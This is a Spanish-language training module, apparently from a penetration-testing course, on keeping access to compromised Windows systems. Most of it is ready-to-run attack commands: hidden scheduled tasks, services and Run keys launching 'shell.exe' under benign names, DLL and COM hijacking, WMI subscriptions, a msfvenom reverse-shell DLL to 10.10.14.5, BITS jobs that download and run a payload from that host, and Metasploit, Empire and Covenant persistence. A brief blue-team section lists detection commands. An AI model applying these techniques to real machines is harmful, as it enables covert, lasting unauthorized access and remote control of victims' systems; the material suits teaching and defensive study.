# 🔄 Persistencia en Windows

> *"Escalaste a Administrator o SYSTEM. Ahora necesitas mantenerte ahí. Este documento cubre cómo establecer persistencia en sistemas Windows de forma que sobreviva reinicios y limpiezas básicas."*

---

## 📋 Tabla de contenido

1. [Registry Run keys](#1-registry-run-keys)
2. [Scheduled tasks](#2-scheduled-tasks)
3. [Windows services](#3-windows-services)
4. [DLL hijacking](#4-dll-hijacking)
5. [Startup folder](#5-startup-folder)
6. [WMI event subscriptions](#6-wmi-event-subscriptions)
7. [COM hijacking](#7-com-hijacking)
8. [Registry RunOnce](#8-registry-runonce)
9. [ BITS jobs](#9-bits-jobs)
10. [Herramientas](#10-herramientas)
11. [Defensa y remediación](#11-defensa-y-remediación)
12. [Referencias](#12-referencias)

---

## 1. Registry Run keys

Las claves Run se ejecutan en cada login de usuario.

### Localizar Run keys

```powershell
# Run keys del sistema
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Run keys del usuario
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Para todos los usuarios
reg query "HKU\" 2>nul
reg query HKU\S-1-5-21-*\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Crear persistencia

```powershell
# Run key del usuario (no requiere admin)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SystemHelper" /t REG_SZ /d "C:\Users\victim\shell.exe" /f

# Run key del sistema (requiere admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SecurityService" /t REG_SZ /d "C:\Program Files\service.exe" /f
```

### Ejemplo con PowerShell

```powershell
# Crear persistencia con PowerShell
$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdate"
$regValue = "C:\Users\victim\update.exe"

New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force

# Verificar
Get-ItemProperty -Path $regPath -Name $regName
```

---

## 2. Scheduled tasks

Las tareas programadas son una de las formas más robustas de persistencia.

### Crear tarea programada

```powershell
# Crear tarea básica
schtasks /create /tn "SystemUpdate" /tr "C:\Users\victim\shell.exe" /sc daily /st 09:00

# Crear tarea con privilegios elevados
schtasks /create /tn "SystemUpdate" /tr "C:\Users\victim\shell.exe" /sc daily /st 09:00 /ru SYSTEM

# Crear tarea que se ejecute en cada inicio
schtasks /create /tn "SystemUpdate" /tr "C:\Users\victim\shell.exe" /sc onstart /ru SYSTEM

# Crear tarea oculta
schtasks /create /tn "SystemUpdate" /tr "C:\Users\victim\shell.exe" /sc daily /st 09:00 /f
```

### PowerShell avanzado

```powershell
# Crear tarea con XML (más control)
$action = New-ScheduledTaskAction -Execute "C:\Users\victim\shell.exe"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
$settings = New-ScheduledTaskSettingsSet -Hidden
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force

# Verificar
Get-ScheduledTask -TaskName "SystemUpdate"
```

### Tarea programada persistente

```powershell
# Tarea que se ejecute cada 5 minutos
$action = New-ScheduledTaskAction -Execute "C:\Users\victim\shell.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)

Register-ScheduledTask -TaskName "NetworkCheck" -Action $action -Trigger $trigger -Force
```

---

## 3. Windows services

Crear servicios personalizados para persistencia.

### Crear servicio

```powershell
# Crear servicio básico
sc create "SystemHelper" binPath= "C:\Users\victim\service.exe" start= auto

# Crear servicio que corra como SYSTEM
sc create "SystemHelper" binPath= "C:\Users\victim\service.exe" start= auto obj= "LocalSystem"

# Crear servicio con descripción
sc create "SystemHelper" binPath= "C:\Users\victim\service.exe" start= auto DisplayName= "System Helper Service"
sc description "SystemHelper" "Provides system monitoring and diagnostics"
```

### PowerShell

```powershell
# Crear servicio con PowerShell
New-Service -Name "SystemHelper" -BinaryPathName "C:\Users\victim\service.exe" -StartupType Automatic -DisplayName "System Helper Service"

# Verificar
Get-Service -Name "SystemHelper"
```

### Modificar servicio existente

```powershell
# Si puedes modificar un servicio existente
sc config "VulnService" binPath= "C:\Users\victim\shell.exe"

# O cambiar el path a un directorio world-writable
sc config "VulnService" binPath= "C:\Temp\service.exe"
```

---

## 4. DLL hijacking

Inyectar DLLs en directorios que las aplicaciones buscan.

### Crear DLL maliciosa

```powershell
# Con msfvenom (en Linux)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll

# Con C#
# https://github.com/TheWover/donut
```

### DLL search order

```powershell
# Buscar DLLs faltantes con Process Monitor
# 1. Filtrar: Result = NAME NOT FOUND
# 2. Filtrar: Path ends with .dll
# 3. Ejecutar la aplicación
# 4. Ver qué DLLs busca y no encuentra
```

### Ejemplo de inyección

```powershell
# 1. Detectar app que busca missing.dll
# Proceso: C:\Program Files\App\app.exe
# Busca: C:\Program Files\App\missing.dll (no existe)

# 2. Crear directorio y copiar DLL
copy hijack.dll "C:\Program Files\App\missing.dll"

# 3. Ejecutar la app
"C:\Program Files\App\app.exe"
# Windows carga tu DLL en lugar de buscar en otros directorios
```

---

## 5. Startup folder

Las carpetas de inicio ejecutan programas en cada login.

### Localizar carpetas de inicio

```powershell
# Startup del usuario actual
echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

# Startup de todos los usuarios
echo %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup

# PowerShell
$currentUserStartup = [Environment]::GetFolderPath("Startup")
$allUsersStartup = [Environment]::GetFolderPath("CommonStartup")

Write-Host "Current user: $currentUserStartup"
Write-Host "All users: $allUsersStartup"
```

### Crear persistencia

```powershell
# Copiar binary al startup del usuario
copy C:\Users\victim\shell.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Copiar al startup de todos los usuarios (requiere admin)
copy C:\Users\victim\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\service.exe"
```

### VBS script en startup

```powershell
# Crear script VBS que ejecute tu binary ocultamente
cat > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" << 'EOF'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\Users\victim\shell.exe", 0, False
Set WshShell = Nothing
EOF
```

---

## 6. WMI event subscriptions

WMI puede ejecutar código en respuesta a eventos del sistema.

### Crear subscripción

```powershell
# Crear evento que se ejecute cada 5 minutos
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "C:\Users\victim\shell.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### Ejemplo más simple

```powershell
# Usar PowerShell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "LoginFilter"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "LoginConsumer"
    CommandLineTemplate = "C:\Users\victim\shell.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## 7. COM hijacking

Inyectar código en objetos COM que se cargan automáticamente.

### Localizar CLSIDs

```powershell
# Buscar CLSIDs de autostart
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f "InprocServer32"

# Filtrar por DLLs que no existen
# Usar Process Monitor para ver qué CLSIDs busca el sistema
```

### Crear COM hijack

```powershell
# 1. Encontrar CLSID que busca el sistema pero no existe
# Proceso: explorer.exe busca HKCR\CLSID\{MALICIOUS-CLSID}

# 2. Crear registry entries
reg add "HKCU\SOFTWARE\Classes\CLSID\{MALICIOUS-CLSID}\InprocServer32" /ve /d "C:\Users\victim\hijack.dll" /f
reg add "HKCU\SOFTWARE\Classes\CLSID\{MALICIOUS-CLSID}\InprocServer32" /v "ThreadingModel" /d "Both" /f

# 3. La DLL se cargará cuando explorer.exe busque ese CLSID
```

---

## 8. Registry RunOnce

Similar a Run pero se ejecuta una sola vez y luego se elimina.

```powershell
# RunOnce del usuario
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "SystemUpdate" /d "C:\Users\victim\shell.exe" /f

# RunOnce del sistema (se ejecuta en el próximo login)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "SystemUpdate" /d "C:\Users\victim\shell.exe" /f
```

---

## 9. BITS jobs

Background Intelligent Transfer Service puede ejecutar tareas.

### Crear BITS job

```powershell
# Crear BITS job que descargue y ejecute
Start-BitsTransfer -Source "http://10.10.14.5/shell.exe" -Destination "C:\Users\victim\shell.exe"
Start-Process "C:\Users\victim\shell.exe"

# O con cmd
bitsadmin /create myJob
bitsadmin /addfile myJob http://10.10.14.5/shell.exe C:\Users\victim\shell.exe
bitsadmin /RESUME myJob
bitsadmin /complete myJob
```

### BITS job persistente

```powershell
# Crear tarea programada que ejecute BITS job
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command Start-BitsTransfer -Source http://10.10.14.5/shell.exe -Destination C:\Users\victim\shell.exe; Start-Process C:\Users\victim\shell.exe"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am

Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -Force
```

---

## 10. Herramientas

### Metasploit persistence

```bash
# En tu sesión Meterpreter
run persistence -h

# Crear persistencia
run persistence -U -i -p 4444 -r 10.10.14.5

# Opciones:
# -U: ejecutar en cada login de usuario
# -S: ejecutar como servicio
# -i: intervalo en segundos
```

### PowerShell Empire

```powershell
# Generar payload de persistencia
Empire> usemodule persistence/userland/registry
Empire> set Agent <agent_id>
Empire> execute
```

### Covenant

```powershell
# Generar grunt (implant) con persistencia
covenant> grunts create
covenant> tasks create <grunt_id> PersistRegistry
```

---

## 11. Defensa y remediación

### Para Blue Team / Administradores

| Vector | Detección | Mitigación |
|---|---|---|
| **Run keys** | Auditar `reg query` regularmente | Monitorear cambios en Run keys |
| **Scheduled tasks** | `schtasks /query` | Auditar tareas no autorizadas |
| **Services** | `sc query` | Principio de mínimo privilegio |
| **DLL hijacking** | Process Monitor | Usar paths absolutos |
| **Startup folder** | Auditar `%APPDATA%\...\Startup` | Restringir escritura |
| **WMI** | `Get-WmiObject -Namespace root\subscription` | Monitorear WMI |

### Monitoreo activo

```powershell
# Script de auditoría de persistencia
Write-Host "=== Run Keys ===" -ForegroundColor Yellow
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul

Write-Host "`n=== Scheduled Tasks ===" -ForegroundColor Yellow
schtasks /query /fo table

Write-Host "`n=== Services ===" -ForegroundColor Yellow
sc query type= service state= all | findstr "SERVICE_NAME"

Write-Host "`n=== Startup Folder ===" -ForegroundColor Yellow
dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul

Write-Host "`n=== WMI Subscriptions ===" -ForegroundColor Yellow
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### Sysmon

```powershell
# Instalar Sysmon para monitoreo avanzado
sysmon64.exe -i

# Configurar reglas para detectar persistencia
# https://github.com/SwiftOnSecurity/sysmon-config
```

### Autoruns (Sysinternals)

```powershell
# Descargar y ejecutar Autoruns
autoruns.exe

# Ver todas las entradas de autostart
# Exportar a CSV para análisis
autoruns.exe /a /c autoruns.csv
```

---

## 12. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **MITRE ATT&CK — Persistence** | [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/) |
| **HackTricks — Windows Persistence** | [https://book.hacktricks.xyz/windows-hardening/persistence](https://book.hacktricks.xyz/windows-hardening/persistence) |
| **LOLBAS** | [https://lolbas-project.github.io](https://lolbas-project.github.io) |
| **Autoruns** | [https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) |
| **Sysmon** | [https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |

### Tácticas MITRE ATT&CK

| ID | Táctica | Técnica |
|---|---|---|
| T1547.001 | Boot or Logon Autostart | Registry Run Keys |
| T1053.005 | Scheduled Task | Windows Scheduled Tasks |
| T1543.003 | Create System Process | Windows Services |
| T1574.001 | DLL Search Order Hijacking | DLL Hijacking |
| T1546.003 | WMI Event Subscription | WMI Persistence |

---

## 📝 Entregable de portafolio

```markdown
# Persistencia Windows — [Nombre del sistema]

## Contexto
- SO: Windows Server 2016
- Acceso actual: Administrator
- Objetivo: mantener acceso tras reinicio

## Vector elegido
- Registry Run key (HKCU)
- Scheduled task oculta

## Implementación
1. `reg add HKCU\...\Run /v "SystemUpdate" /d "C:\shell.exe"`
2. `schtasks /create /tn "SystemUpdate" /tr "C:\shell.exe" /sc daily /st 09:00`

## Detección
- `reg query HKCU\...\Run`
- `schtasks /query`

## Evidencia
- Screenshot: [enlace]
- Output de comandos: [enlace]
```

---

**[⬅ Persistencia Linux](./01-linux-persistence.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Movimiento lateral](../lateral-movement/01-lateral-movement.md)**
